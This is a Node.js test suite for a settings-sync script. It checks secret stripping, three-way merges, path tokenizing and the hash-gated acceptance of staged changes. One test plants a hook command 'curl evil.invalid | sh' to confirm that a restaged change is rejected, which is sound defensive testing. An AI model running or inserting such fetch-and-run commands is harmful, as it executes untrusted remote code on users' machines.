import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import net from 'node:net';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { settingsFrom, translateHome, mergeSettings, planApply, readJson, writeJson, provisionerManagedProjectId } from '../sync-settings.mjs';

const sandbox = process.argv[2];
const bashPath = process.argv[3] ?? ['/opt/homebrew/bin/bash', '/bin/bash'].find(candidate => fs.existsSync(candidate));
const syncPath = fileURLToPath(new URL('../sync-settings.mjs', import.meta.url));
const configPath = path.join(sandbox, 'config.json');
const settingsPath = path.join(sandbox, 'settings.json');
const basePath = path.join(sandbox, 'base.json');
fs.mkdirSync(sandbox, { recursive: true });
function check(description, exercise) {
  exercise();
  console.log(`  ok   ${description}`);
}
function stagedHashOf(stagedPath) {
  const execution = spawnSync(process.execPath, [syncPath, 'staged-hash', stagedPath], { encoding: 'utf8' });
  assert.equal(execution.status, 0, execution.stderr);
  const [, stagedHash] = execution.stdout.match(/^staged: ([0-9a-f]{64})\n$/);
  return stagedHash;
}
function runSync(command, input) {
  const execution = spawnSync(process.execPath, [syncPath, command, configPath, settingsPath, basePath, sandbox], { input, encoding: 'utf8' });
  assert.equal(execution.status, 0, execution.stderr);
  return execution.stdout;
}

check('settings exclude machine, runtime, loader secrets and credential-like keys recursively', () => {
  const config = {
    port: 3456, remote: { enabled: true }, coder: { appSlug: 'local' }, sessions: ['local'], sessionRecords: ['local'], unknownState: 1,
    personalToken: 'private', posthog: { enabled: true, apiKey: 'private' }, telegram: { chatId: 'shared', botToken: 'private' },
    agentApi: { enabled: true, password: 'private' }, hooks: [{ id: 'hook', command: 'echo test', api_key: 'private' }],
    projects: [{ id: 'project', path: '/home/repo', wasActive: true, resumeSessionId: 'local' }],
  };
  const safe = settingsFrom(config);
  assert.deepEqual(safe, {
    posthog: { enabled: true }, telegram: { chatId: 'shared' }, agentApi: { enabled: true },
    hooks: [{ id: 'hook', command: 'echo test' }], projects: [{ id: 'project', path: '/home/repo' }],
  });
  const planned = planApply(config, { ...safe, posthog: { enabled: false }, personalToken: 'changed', port: 99 }, safe);
  assert.equal(planned.config.port, 3456);
  assert.deepEqual(planned.config.remote, config.remote);
  assert.deepEqual(planned.config.sessions, config.sessions);
  assert.equal(planned.config.posthog.apiKey, 'private');
  assert.equal(planned.config.posthog.enabled, false);
  assert.equal(planned.config.projects[0].resumeSessionId, 'local');
  const invalidReplacement = planApply(config, { ...safe, posthog: null }, safe);
  assert.deepEqual(invalidReplacement.config.posthog, config.posthog);
  writeJson(configPath, config);
  writeJson(settingsPath, safe);
  writeJson(basePath, safe);
  runSync('collect');
  assert.equal(fs.readFileSync(settingsPath, 'utf8').includes('private'), false);
});

check('id conflicts warn with the specific id and keep the dashboard entry', () => {
  const warnings = [];
  const merged = mergeSettings({
    live: { hooks: [{ id: 'hook', command: 'dashboard' }] },
    wanted: { hooks: [{ id: 'hook', command: 'file' }] },
    base: { hooks: [{ id: 'hook', command: 'base' }] },
    warn: key => warnings.push(key),
  });
  assert.deepEqual(merged.hooks, [{ id: 'hook', command: 'dashboard' }]);
  assert.deepEqual(warnings, ['hooks.hook']);
});

check('home tokens round trip in project paths, nested strings and hook commands', () => {
  const laptop = { repoRoots: ['/Users/x/Projects', '/Users/xyz/Projects'], hooks: [{ id: 'hook', command: 'node /Users/x/.claude/hook.mjs' }], projects: [{ id: 'project', path: '/Users/x/Projects/repo' }] };
  const tokenized = translateHome(laptop, '/Users/x', 'tokenize');
  assert.equal(tokenized.hooks[0].command, 'node {{HOME}}/.claude/hook.mjs');
  assert.equal(tokenized.repoRoots[1], '/Users/xyz/Projects');
  const box = translateHome(tokenized, '/home/coder', 'render');
  assert.equal(box.projects[0].path, '/home/coder/Projects/repo');
  assert.deepEqual(translateHome(box, '/home/coder', 'tokenize'), tokenized);
});

check('three-way scalars apply file edits, retain live edits and warn on divergent edits', () => {
  const warnings = [];
  const merge = (live, wanted, base) => mergeSettings({ live, wanted, base, warn: key => warnings.push(key) });
  assert.deepEqual(merge({ scrollback: 1 }, { scrollback: 2 }, { scrollback: 1 }), { scrollback: 2 });
  assert.deepEqual(merge({ scrollback: 2 }, { scrollback: 1 }, { scrollback: 1 }), { scrollback: 2 });
  assert.deepEqual(merge({ scrollback: 2 }, { scrollback: 3 }, { scrollback: 1 }), { scrollback: 2 });
  assert.deepEqual(warnings, ['scrollback']);
  assert.deepEqual(merge({ scrollback: 1 }, { scrollback: 1 }, { scrollback: 1 }), { scrollback: 1 });
  assert.deepEqual(merge({}, { scrollback: 1 }, {}), { scrollback: 1 });
  assert.deepEqual(merge({ scrollback: 2 }, { scrollback: 1 }, {}), { scrollback: 2 });
  assert.deepEqual(merge({ scrollback: 1 }, {}, { scrollback: 1 }), {});
  assert.deepEqual(merge({}, { scrollback: 1 }, { scrollback: 1 }), {});
  assert.deepEqual(merge({ hooks: [] }, { hooks: null }, { hooks: [] }), { hooks: null });
});

check('arrays merge per id and advance only the base entries actually applied', () => {
  const base = { hooks: [{ id: 'live', command: 'old' }, { id: 'file', command: 'old' }] };
  const live = { hooks: [{ id: 'live', command: 'dashboard' }, { id: 'file', command: 'old' }] };
  const wanted = { hooks: [{ id: 'live', command: 'old' }, { id: 'file', command: 'tracked' }, { id: 'added', command: 'new' }] };
  const planned = planApply(live, wanted, base);
  assert.deepEqual(planned.config.hooks, [{ id: 'live', command: 'dashboard' }, { id: 'file', command: 'tracked' }, { id: 'added', command: 'new' }]);
  assert.deepEqual(planned.base.hooks, wanted.hooks);
  const collected = mergeSettings({ live: planned.config, wanted, base: planned.base, mode: 'collect' });
  assert.equal(collected.hooks.find(hook => hook.id === 'live').command, 'dashboard');
});

check('missing project paths stay tracked without being added to live config', () => {
  const wanted = { projects: [{ id: 'missing', path: `${sandbox}/missing` }] };
  const planned = planApply({ projects: [] }, wanted, {});
  assert.deepEqual(planned.config.projects, []);
  const collected = mergeSettings({ live: planned.config, wanted, base: planned.base, mode: 'collect' });
  assert.deepEqual(collected, wanted);
});

check('apply leaves an already seeded live project list exactly as it is', () => {
  const liveProject = { id: 'box-only', path: sandbox, wasActive: true, resumeSessionId: 'transcript' };
  const config = { projects: [liveProject] };
  const dotfilesOnlyProject = { id: 'dotfiles-only', path: sandbox };
  const planned = planApply(config, { projects: [dotfilesOnlyProject] }, settingsFrom(config));
  assert.deepEqual(planned.config.projects, [liveProject]);
});

check('a project skipped for a missing path is added once its path exists', () => {
  const projectPath = path.join(sandbox, 'appears-later');
  fs.rmSync(projectPath, { recursive: true, force: true });
  const wanted = { projects: [{ id: 'later', path: projectPath }] };
  const skipped = planApply({ port: 1 }, wanted, {});
  assert.deepEqual(skipped.config.projects ?? [], []);
  fs.mkdirSync(projectPath);
  const added = planApply(skipped.config, wanted, skipped.base);
  assert.deepEqual(added.config.projects, wanted.projects);
  assert.deepEqual(added.base.projects, wanted.projects);
});

check('first box collection without a base keeps curated file values and fills only missing keys', () => {
  const collected = mergeSettings({ live: { scrollback: 1000, cursorBlink: true }, wanted: { scrollback: 50000 }, base: {}, mode: 'collect' });
  assert.deepEqual(collected, { scrollback: 50000, cursorBlink: true });
});

check('a malformed box packet is refused before anything is staged', () => {
  const stagedPath = path.join(sandbox, 'staged', 'malformed.json');
  writeJson(settingsPath, { scrollback: 100 });
  const execution = spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify({ home: sandbox, live: {}, base: {} }), encoding: 'utf8' });
  assert.notEqual(execution.status, 0);
  assert.equal(fs.existsSync(stagedPath), false);
  assert.deepEqual(readJson(settingsPath), { scrollback: 100 });
});

check('collecting box edits leaves the box untouched and old committed settings cannot clobber them', () => {
  const committed = { scrollback: 100, hooks: [{ id: 'hook', command: 'old' }] };
  const live = { scrollback: 200, hooks: [{ id: 'hook', command: 'new' }], sessions: ['untouched'] };
  writeJson(configPath, live);
  writeJson(settingsPath, committed);
  writeJson(basePath, committed);
  const previousBytes = fs.readFileSync(configPath, 'utf8');
  const packet = { home: sandbox, live, base: committed, projectPaths: [] };
  const stagedPath = path.join(sandbox, 'staged', 'collected.json');
  const committedBytes = fs.readFileSync(settingsPath, 'utf8');
  const collectRemote = () => spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify(packet), encoding: 'utf8' });
  const collection = collectRemote();
  assert.equal(collection.status, 0, collection.stderr);
  assert.match(collection.stdout, /\[warned\].*box changes staged; review with devbox collect --diff, accept with devbox collect --accept <hash>/);
  assert.equal(fs.readFileSync(settingsPath, 'utf8'), committedBytes);
  assert.deepEqual(settingsFrom(readJson(stagedPath)), settingsFrom(live));
  assert.equal(fs.statSync(stagedPath).mode & 0o777, 0o600);
  assert.equal(fs.readFileSync(configPath, 'utf8'), previousBytes);
  const acceptance = spawnSync(process.execPath, [syncPath, 'accept', stagedPath, settingsPath, stagedHashOf(stagedPath)], { encoding: 'utf8' });
  assert.equal(acceptance.status, 0, acceptance.stderr);
  assert.deepEqual(readJson(settingsPath), settingsFrom(live));
  assert.equal(fs.existsSync(stagedPath), false);
  const unchangedCollection = collectRemote();
  assert.equal(unchangedCollection.status, 0, unchangedCollection.stderr);
  assert.equal(unchangedCollection.stdout, '');
  assert.equal(fs.existsSync(stagedPath), false);
  writeJson(settingsPath, committed);
  assert.deepEqual(readJson(basePath), committed);
  const planned = planApply(live, committed, committed);
  assert.deepEqual(planned.config, live);
  assert.deepEqual(planned.base, committed);
});

check('collecting a box whose only difference is the provisioner-managed project stages nothing', () => {
  const committed = { scrollback: 100, projects: [{ id: 'shared', path: '{{HOME}}/shared' }] };
  writeJson(settingsPath, committed);
  const managedProject = { id: provisionerManagedProjectId, name: 'posthog', path: `${sandbox}/posthog` };
  const live = { scrollback: 100, projects: [{ id: 'shared', path: `${sandbox}/shared` }, managedProject] };
  const packet = { home: sandbox, live, base: translateHome(committed, sandbox, 'render'), projectPaths: [`${sandbox}/shared`, managedProject.path] };
  const stagedPath = path.join(sandbox, 'staged', 'managed.json');
  fs.rmSync(stagedPath, { force: true });
  const collection = spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify(packet), encoding: 'utf8' });
  assert.equal(collection.status, 0, collection.stderr);
  assert.equal(collection.stdout, '');
  assert.equal(fs.existsSync(stagedPath), false);
});

check('accept refuses and changes nothing when the repo settings file changed after staging', () => {
  const committed = { scrollback: 100 };
  writeJson(settingsPath, committed);
  const packet = { home: sandbox, live: { scrollback: 200 }, base: committed, projectPaths: [] };
  const stagedPath = path.join(sandbox, 'staged', 'stale.json');
  const collection = spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify(packet), encoding: 'utf8' });
  assert.equal(collection.status, 0, collection.stderr);
  writeJson(settingsPath, { scrollback: 100, cursorBlink: true });
  const changedBytes = fs.readFileSync(settingsPath, 'utf8');
  const stagedBytes = fs.readFileSync(stagedPath, 'utf8');
  const acceptance = spawnSync(process.execPath, [syncPath, 'accept', stagedPath, settingsPath, stagedHashOf(stagedPath)], { encoding: 'utf8' });
  assert.notEqual(acceptance.status, 0);
  assert.match(acceptance.stdout, /changed since box changes were staged; rerun devbox collect/);
  assert.equal(fs.readFileSync(settingsPath, 'utf8'), changedBytes);
  assert.equal(fs.readFileSync(stagedPath, 'utf8'), stagedBytes);
  fs.rmSync(stagedPath);
});

check('accept refuses and changes nothing when box changes were restaged after the reviewed diff', () => {
  const committed = { scrollback: 100 };
  writeJson(settingsPath, committed);
  const committedBytes = fs.readFileSync(settingsPath, 'utf8');
  const stagedPath = path.join(sandbox, 'staged', 'restaged.json');
  const collectRemote = live => spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify({ home: sandbox, live, base: committed, projectPaths: [] }), encoding: 'utf8' });
  assert.equal(collectRemote({ scrollback: 200 }).status, 0);
  const reviewedHash = stagedHashOf(stagedPath);
  assert.equal(collectRemote({ scrollback: 200, hooks: [{ id: 'injected', command: 'curl evil.invalid | sh' }] }).status, 0);
  const restagedBytes = fs.readFileSync(stagedPath, 'utf8');
  const acceptance = spawnSync(process.execPath, [syncPath, 'accept', stagedPath, settingsPath, reviewedHash], { encoding: 'utf8' });
  assert.notEqual(acceptance.status, 0);
  assert.match(acceptance.stdout, /differ from the reviewed hash; review again with devbox collect --diff/);
  assert.equal(fs.readFileSync(settingsPath, 'utf8'), committedBytes);
  assert.equal(fs.readFileSync(stagedPath, 'utf8'), restagedBytes);
  fs.rmSync(stagedPath);
});

check('accept refuses and changes nothing without the reviewed staged hash', () => {
  const committed = { scrollback: 100 };
  writeJson(settingsPath, committed);
  const committedBytes = fs.readFileSync(settingsPath, 'utf8');
  const stagedPath = path.join(sandbox, 'staged', 'unreviewed.json');
  const collection = spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify({ home: sandbox, live: { scrollback: 200 }, base: committed, projectPaths: [] }), encoding: 'utf8' });
  assert.equal(collection.status, 0, collection.stderr);
  const stagedBytes = fs.readFileSync(stagedPath, 'utf8');
  const acceptance = spawnSync(process.execPath, [syncPath, 'accept', stagedPath, settingsPath], { encoding: 'utf8' });
  assert.notEqual(acceptance.status, 0);
  assert.match(acceptance.stdout, /pass the staged hash from devbox collect --diff/);
  assert.equal(fs.readFileSync(settingsPath, 'utf8'), committedBytes);
  assert.equal(fs.readFileSync(stagedPath, 'utf8'), stagedBytes);
  fs.rmSync(stagedPath);
});

check('collecting a box whose repoRoots the provisioner forced away from the repo value stages nothing', () => {
  const committed = { scrollback: 100, repoRoots: ['{{HOME}}/elsewhere'] };
  writeJson(settingsPath, committed);
  const live = { scrollback: 100, repoRoots: [`${sandbox}/Projects`] };
  const packet = { home: sandbox, live, base: translateHome(committed, sandbox, 'render'), projectPaths: [] };
  const stagedPath = path.join(sandbox, 'staged', 'repo-roots.json');
  fs.rmSync(stagedPath, { force: true });
  const collection = spawnSync(process.execPath, [syncPath, 'collect-remote', stagedPath, settingsPath], { input: JSON.stringify(packet), encoding: 'utf8' });
  assert.equal(collection.status, 0, collection.stderr);
  assert.equal(collection.stdout, '');
  assert.equal(fs.existsSync(stagedPath), false);
});

check('laptop collection updates its base and apply preserves excluded values and prior bytes', () => {
  writeJson(configPath, { scrollback: 300, port: 42, remote: { enabled: true }, sessions: ['kept'] });
  writeJson(settingsPath, { scrollback: 100 });
  writeJson(basePath, { scrollback: 100 });
  runSync('collect');
  assert.deepEqual(readJson(settingsPath), { scrollback: 300 });
  assert.deepEqual(readJson(basePath), { scrollback: 300 });
  writeJson(settingsPath, { scrollback: 400, port: 99, accessToken: 'private' });
  const originalBytes = fs.readFileSync(configPath, 'utf8');
  runSync('apply');
  assert.deepEqual(readJson(configPath), { scrollback: 400, port: 42, remote: { enabled: true }, sessions: ['kept'] });
  assert.equal(fs.statSync(configPath).mode & 0o777, 0o600);
  assert.equal(fs.statSync(basePath).mode & 0o777, 0o600);
  const backups = fs.readdirSync(sandbox).filter(name => name.startsWith('config.json.') && name.endsWith('.bak'));
  assert.equal(backups.length, 1);
  assert.equal(fs.readFileSync(path.join(sandbox, backups[0]), 'utf8'), originalBytes);
  assert.equal(fs.statSync(path.join(sandbox, backups[0])).mode & 0o777, 0o600);
});

check('script collect discovers the work glimmervoid collector and updates its shared file and base', () => {
  const fixtureRepo = path.join(sandbox, 'collector-repo');
  const fixtureHome = path.join(sandbox, 'collector-home');
  const repoRoot = fileURLToPath(new URL('../../', import.meta.url));
  fs.cpSync(path.join(repoRoot, 'script'), path.join(fixtureRepo, 'script'), { recursive: true });
  fs.mkdirSync(path.join(fixtureRepo, 'glimmervoid'), { recursive: true });
  fs.mkdirSync(path.join(fixtureRepo, 'profiles/work'), { recursive: true });
  fs.mkdirSync(path.join(fixtureHome, '.glimmervoid'), { recursive: true });
  for (const fileName of ['collect.sh', 'install.sh', 'sync-settings.mjs']) fs.copyFileSync(path.join(repoRoot, 'glimmervoid', fileName), path.join(fixtureRepo, 'glimmervoid', fileName));
  writeJson(path.join(fixtureRepo, 'profiles/work/profile.json'), { topics: ['glimmervoid'] });
  writeJson(path.join(fixtureRepo, 'profiles/work/glimmervoid.settings.json'), { scrollback: 100 });
  writeJson(path.join(fixtureHome, '.glimmervoid/config.json'), { scrollback: 200, port: 3456, apiToken: 'private' });
  writeJson(path.join(fixtureHome, '.glimmervoid/dotfiles-settings-base.json'), { scrollback: 100 });
  const execution = spawnSync(bashPath, [path.join(fixtureRepo, 'script/collect')], {
    env: { ...process.env, HOME: fixtureHome, DOTFILES_PROFILE: 'work', PATH: `${path.dirname(bashPath)}:${process.env.PATH}` }, encoding: 'utf8',
  });
  assert.equal(execution.status, 0, execution.stderr);
  assert.deepEqual(readJson(path.join(fixtureRepo, 'profiles/work/glimmervoid.settings.json')), { scrollback: 200 });
  assert.deepEqual(readJson(path.join(fixtureHome, '.glimmervoid/dotfiles-settings-base.json')), { scrollback: 200 });
  assert.match(execution.stdout, /1 of 1 topics/);
});

const server = net.createServer(socket => socket.end());
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
try {
  writeJson(configPath, { port: server.address().port, scrollback: 1 });
  writeJson(settingsPath, { scrollback: 2 });
  writeJson(basePath, { scrollback: 1 });
  const previousConfig = fs.readFileSync(configPath, 'utf8');
  const previousBase = fs.readFileSync(basePath, 'utf8');
  const execution = spawn(process.execPath, [syncPath, 'apply', configPath, settingsPath, basePath, sandbox]);
  let output = '';
  execution.stdout.on('data', bytes => { output += bytes; });
  assert.equal(await new Promise(resolve => execution.on('exit', resolve)), 0);
  assert.match(output, /\[warned\].*changes pending/);
  assert.equal(fs.readFileSync(configPath, 'utf8'), previousConfig);
  assert.equal(fs.readFileSync(basePath, 'utf8'), previousBase);
  console.log('  ok   a real listening server defers settings and base writes');
} finally {
  await new Promise(resolve => server.close(resolve));
}
